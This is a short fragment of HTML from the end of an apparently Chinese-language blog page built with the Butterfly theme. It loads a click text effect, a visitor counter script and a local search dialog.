+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="MING,LOVE,ME" data-fontsize="10px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
